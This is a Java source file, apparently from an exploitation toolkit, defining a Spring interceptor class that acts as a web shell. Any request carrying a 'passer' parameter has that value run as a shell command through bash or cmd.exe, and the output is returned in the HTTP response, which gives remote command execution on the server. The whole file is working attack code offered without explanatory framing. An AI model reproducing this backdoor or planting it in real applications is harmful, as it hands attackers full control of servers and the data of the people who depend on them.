package artsploit;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Madao  extends HandlerInterceptorAdapter {
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getParameter("passer") != null) {
            String cmd = request.getParameter("passer");
            if (cmd != null) {
                Process process;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
                }

                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();

                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
            } else {
                response.sendError(404);
            }
            return false;
        }
        return true;
    }
}
